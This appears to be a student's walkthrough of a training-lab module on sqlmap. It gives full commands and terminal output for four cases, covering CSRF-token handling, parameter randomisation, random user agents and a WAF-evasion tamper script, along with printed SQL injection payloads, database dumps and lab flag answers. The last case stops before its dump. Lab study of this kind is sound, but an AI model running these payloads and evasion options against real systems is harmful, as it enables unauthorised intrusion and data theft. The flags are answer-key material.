# Section 08: Advanced Database Emuneration

Module: 18. SQLMap Essentials

---

## Questions & Answers

### 1. What's the contents of table flag8? (Case #8)

Context:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-hw8teyjkz7-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -u "http://154.57.164.82:31035/case8.php" --data="id=1&t0ken=2xQRGLS3Cv8bQyjjcNb6knCJiOTmQZkRnML87PPwo4" --csrf-token="t0ken" --batch --search -T flag8
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.6#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:23:48 /2026-09-09/

[09:23:48] [INFO] resuming back-end DBMS 'mysql' 
[09:23:48] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=4nqpctke3ts...394bdkia2a'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5335=5335&t0ken=2xQRGLS3Cv8bQyjjcNb6knCJiOTmQZkRnML87PPwo4

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#&t0ken=2xQRGLS3Cv8bQyjjcNb6knCJiOTmQZkRnML87PPwo4

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9432 FROM (SELECT(SLEEP(5)))hXGp)&t0ken=2xQRGLS3Cv8bQyjjcNb6knCJiOTmQZkRnML87PPwo4

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT CONCAT(0x71716a6a71,0x62676a4a5444536144794d4255514e6e56746c6e65434d41496f47784944724e78416e43484a4d42,0x717a707171),NULL,NULL,NULL,NULL,NULL-- -&t0ken=2xQRGLS3Cv8bQyjjcNb6knCJiOTmQZkRnML87PPwo4
---
[09:23:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
do you want sqlmap to consider provided table(s):
[1] as LIKE table names (default)
[2] as exact table names
> 1
[09:23:49] [INFO] searching tables LIKE 'flag8'
Database: testdb
[1 table]
+-------+
| flag8 |
+-------+

do you want to dump found table(s) entries? [Y/n] Y
which database(s)?
[a]ll (default)
[testdb]
[q]uit
> a
which table(s) of database 'testdb'?
[a]ll (default)
[flag8]
[s]kip
[q]uit
> a
[09:23:50] [INFO] fetching columns for table 'flag8' in database 'testdb'
[09:23:51] [INFO] fetching entries for table 'flag8' in database 'testdb'
Database: testdb
Table: flag8
[1 entry]
+----+-----------------------------------+
| id | content                           |
+----+-----------------------------------+
| 1  | HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} |
+----+-----------------------------------+

[09:23:52] [INFO] table 'testdb.flag8' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/flag8.csv'
[09:23:52] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[09:23:52] [WARNING] your sqlmap version is outdated

[*] ending @ 09:23:52 /2026-09-09/
```

**Answer:** `HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}`

---

### 2. What's the contents of table flag9? (Case #9)

Context:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-hw8teyjkz7-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -u "http://154.57.164.82:31035/case9.php?id=1&uid=2985099718" --randomize=uid --batch --search -T flag9
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.6#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:26:03 /2026-09-09/

[09:26:03] [INFO] testing connection to the target URL
[09:26:04] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:26:04] [INFO] testing if the target URL content is stable
[09:26:04] [INFO] target URL content is stable
[09:26:04] [INFO] testing if GET parameter 'id' is dynamic
[09:26:04] [INFO] GET parameter 'id' appears to be dynamic
[09:26:05] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[09:26:05] [INFO] testing for SQL injection on GET parameter 'id'
[09:26:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:26:06] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Rice")
[09:26:11] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[09:26:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:26:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:26:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:26:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:26:12] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[09:26:13] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[09:26:13] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[09:26:13] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[09:26:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:26:14] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:26:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:26:14] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:26:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[09:26:15] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[09:26:15] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:26:15] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[09:26:15] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[09:26:16] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[09:26:16] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[09:26:16] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[09:26:16] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[09:26:17] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[09:26:17] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[09:26:17] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[09:26:17] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[09:26:18] [INFO] testing 'Generic inline queries'
[09:26:18] [INFO] testing 'MySQL inline queries'
[09:26:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:26:29] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[09:26:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:26:40] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[09:26:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:26:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:26:40] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:26:41] [INFO] target URL appears to have 6 columns in query
[09:26:42] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 9910=9910&uid=2985099718

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#&uid=2985099718

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7286 FROM (SELECT(SLEEP(5)))ERId)&uid=2985099718

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71717a6b71,0x51546b594b554c684c4548677571534a474977696d457761536467416b4b46657a7448616c4b4a68,0x7162717071)-- -&uid=2985099718
---
[09:26:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
do you want sqlmap to consider provided table(s):
[1] as LIKE table names (default)
[2] as exact table names
> 1
[09:26:42] [INFO] searching tables LIKE 'flag9'
Database: testdb
[1 table]
+-------+
| flag9 |
+-------+

do you want to dump found table(s) entries? [Y/n] Y
which database(s)?
[a]ll (default)
[testdb]
[q]uit
> a
which table(s) of database 'testdb'?
[a]ll (default)
[flag9]
[s]kip
[q]uit
> a
[09:26:42] [INFO] fetching columns for table 'flag9' in database 'testdb'
[09:26:43] [INFO] fetching entries for table 'flag9' in database 'testdb'
Database: testdb
Table: flag9
[1 entry]
+----+---------------------------------------+
| id | content                               |
+----+---------------------------------------+
| 1  | HTB{700_much_r4nd0mn355_f0r_my_74573} |
+----+---------------------------------------+

[09:26:43] [INFO] table 'testdb.flag9' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/flag9.csv'
[09:26:43] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[09:26:43] [WARNING] your sqlmap version is outdated

[*] ending @ 09:26:43 /2026-09-09/
```

**Answer:** `HTB{700_much_r4nd0mn355_f0r_my_74573}`

---

### 3. What's the contents of table flag10? (Case #10)

Context:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-hw8teyjkz7-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -u "http://154.57.164.82:31035/case10.php" --data="id=1" --random-agent  --batch --search -T flag10 
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.6#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:30:58 /2026-09-09/

[09:30:58] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.8 Safari/530.5' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[09:30:58] [INFO] testing connection to the target URL
[09:30:59] [INFO] testing if the target URL content is stable
[09:30:59] [INFO] target URL content is stable
[09:30:59] [INFO] testing if POST parameter 'id' is dynamic
[09:30:59] [INFO] POST parameter 'id' appears to be dynamic
[09:31:00] [INFO] heuristic (basic) test shows that POST parameter 'id' might be injectable (possible DBMS: 'MySQL')
[09:31:00] [INFO] heuristic (XSS) test shows that POST parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[09:31:00] [INFO] testing for SQL injection on POST parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[09:31:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:31:00] [WARNING] reflective value(s) found and filtering out
[09:31:01] [INFO] POST parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="1698")
[09:31:01] [INFO] testing 'Generic inline queries'
[09:31:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:31:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:31:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:31:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:31:02] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[09:31:02] [WARNING] potential permission problems detected ('command denied')
[09:31:02] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[09:31:03] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[09:31:03] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[09:31:03] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:31:03] [INFO] POST parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[09:31:03] [INFO] testing 'MySQL inline queries'
[09:31:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:31:03] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                  
[09:31:17] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[09:31:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:31:28] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[09:31:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:31:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:31:28] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:31:29] [INFO] target URL appears to have 9 columns in query
[09:31:30] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 9886=9886

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 8673 FROM(SELECT COUNT(*),CONCAT(0x716b7a6271,(SELECT (ELT(8673=8673,1))),0x7171706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7957 FROM (SELECT(SLEEP(5)))IUQO)

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b7a6271,0x594e42474c6f5064706d576c4265705354457957536b49714b534543507658787a64757956476f64,0x7171706271),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[09:31:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
do you want sqlmap to consider provided table(s):
[1] as LIKE table names (default)
[2] as exact table names
> 1
[09:31:30] [INFO] searching tables LIKE 'flag10'
Database: testdb
[1 table]
+--------+
| flag10 |
+--------+

do you want to dump found table(s) entries? [Y/n] Y
which database(s)?
[a]ll (default)
[testdb]
[q]uit
> a
which table(s) of database 'testdb'?
[a]ll (default)
[flag10]
[s]kip
[q]uit
> a
[09:31:30] [INFO] fetching columns for table 'flag10' in database 'testdb'
[09:31:31] [INFO] fetching entries for table 'flag10' in database 'testdb'
Database: testdb
Table: flag10
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{y37_4n07h3r_r4nd0m1z3} |
+----+----------------------------+

[09:31:31] [INFO] table 'testdb.flag10' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/flag10.csv'
[09:31:31] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[09:31:31] [WARNING] your sqlmap version is outdated

[*] ending @ 09:31:31 /2026-09-09/
```

**Answer:** `HTB{y37_4n07h3r_r4nd0m1z3}`

---

### 4. What's the contents of table flag11? (Case #11)

Context:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-hw8teyjkz7-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -u "http://154.57.164.82:31035/case11.php?id=1" --batch --tamper=between --search -T flag11
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:34:11 /2026-09-09/

[09:34:11] [INFO] loading tamper module 'between'
[09:34:11] [INFO] testing connection to the target URL
[09:34:12] [INFO] testing if the target URL content is stable
[09:34:12] [INFO] target URL content is stable
[09:34:12] [INFO] testing if GET parameter 'id' is dynamic
[09:34:12] [INFO] GET parameter 'id' appears to be dynamic
[09:34:13] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[09:34:13] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[09:34:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:34:13] [WARNING] reflective value(s) found and filtering out
[09:34:14] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Rice")
[09:34:14] [INFO] testing 'Generic inline queries'
[09:34:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:34:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:34:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:34:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:34:15] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[09:34:15] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[09:34:16] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[09:34:16] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[09:34:16] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:34:16] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:34:17] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:34:17] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:34:17] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[09:34:17] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[09:34:18] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:34:18] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[09:34:18] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[09:34:19] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[09:34:19] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[09:34:19] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[09:34:20] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[09:34:20] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[09:34:20] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[09:34:20] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[09:34:20] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[09:34:21] [INFO] testing 'MySQL inline queries'
[09:34:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:34:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[09:34:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[09:34:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[09:34:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[09:34:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[09:34:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:34:22] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[09:34:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[09:34:23] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[09:34:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[09:34:23] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[09:34:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[09:34:24] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[09:34:24] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[09:34:25] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[09:34:25] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[09:34:25] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[09:34:25] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[09:34:26] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[09:34:26] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[09:34:26] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[09:34:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[09:34:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[09:34:27] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[09:34:27] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[09:34:27] [INFO] testing 'MySQL AND time-based blind (ELT)'
[09:34:27] [INFO] testing 'MySQL OR time-based blind (ELT)'
[09:34:28] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[09:34:28] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[09:34:28] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[09:34:28] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[09:34:29] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[09:34:29] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[09:34:29] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[09:34:29] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[09:35:04] [INFO] GET parameter 'id' appears to be 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' injectable 
[09:35:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:35:05] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:35:05] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:35:06] [INFO] target URL appears to have 9 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[09:35:24] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[09:35:29] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[09:35:34] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[09:35:39] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[09:35:44] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[09:35:49] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[09:35:54] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[09:35:59] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[09:36:04] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[09:36:09] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[09:36:14] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[09:36:19] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 377 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 7449=7449

    Type: time-based blind
    Title: MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)
    Payload: id=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)
---
[09:36:20] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[09:36:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
do you want sqlmap to consider provided table(s):
[1] as LIKE table names (default)
[2] as exact table names
> 1
[09:36:21] [INFO] searching tables LIKE 'flag11'
[09:36:21] [INFO] fetching number of databases with tables LIKE 'flag11'
[09:36:21] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[09:36:21] [INFO] retrieved: 1
[09:36:22] [INFO] retrieved: testdb
[09:36:32] [INFO] fetching number of tables LIKE 'flag11' in database 'testdb'
[09:36:32] [INFO] retrieved: 1
[09:36:34] [INFO] retrieved: flag11
Database: testdb
[1 table]
+--------+
| flag11 |
+--------+

do you want to dump found table(s) entries? [Y/n] Y
which database(s)?
[a]ll (default)
[testdb]
[q]uit
> a
which table(s) of database 'testdb'?
[a]ll (default)
[flag11]
[s]kip
[q]uit
> a
